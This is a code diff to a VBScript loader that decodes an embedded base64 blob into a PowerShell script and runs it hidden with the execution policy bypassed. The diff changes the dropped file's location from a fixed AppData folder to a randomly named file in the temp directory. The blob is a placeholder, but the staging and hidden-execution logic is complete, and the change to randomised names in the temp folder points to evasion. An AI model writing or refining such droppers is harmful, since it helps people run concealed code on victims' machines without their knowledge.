@@ -1,6 +1,35 @@
 Dim holderX
 holderX="0102"
 
+Dim randomFileName
+
+Function GenerateRandomName(length)
+    Dim i, randomChar, randomName, chars
+    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+    randomName = ""
+    
+    Randomize ' Initialize random seed
+
+    For i = 1 To length
+        randomChar = Mid(chars, Int((Len(chars) * Rnd) + 1), 1)
+        randomName = randomName & randomChar
+    Next ' No variable after Next
+    
+    GenerateRandomName = randomName
+End Function
+
+
+Function GetPS1FilePath()
+    Dim fso, shell, destPath
+    If randomFileName = "" Then
+        randomFileName = GenerateRandomName(10)
+    End If
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    destPath = fso.BuildPath(shell.ExpandEnvironmentStrings("%TEMP%"), randomFileName & ".ps1")
+    GetPS1FilePath = destPath   
+End Function
+
 DecodeBase64ToFile holderX, GetPS1FilePath
 Run
 
@@ -11,23 +40,6 @@ Sub Run()
     Dim timeDif
     command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath() + """"
     shell.Run command, 0, True
-End Sub
-
-Function GetPS1FilePath()
-    Dim fso, shell, scriptPath, destFolder, destPath
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set shell = CreateObject("WScript.Shell")
-    scriptPath = WScript.ScriptFullName
-    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "Hephaestus")
-    destPath = fso.BuildPath(destFolder, "holder.ps1")
-    CreateFolder fso, destFolder
-    GetPS1FilePath = destPath   
-End Function
-
-Sub CreateFolder(fso, folderPath)
-    If Not fso.FolderExists(folderPath) Then
-        fso.CreateFolder(folderPath)
-    End If
 End Sub
 
 Function DecodeBase64ToFile(base64String, outputFilePath)
@@ -48,7 +60,7 @@ Function DecodeBase64ToFile(base64String, outputFilePath)
     stream.Open
     stream.Write binaryData
     
-    stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
+    stream.SaveToFile outputFilePath, 2
     stream.Close
     
     Set stream = Nothing
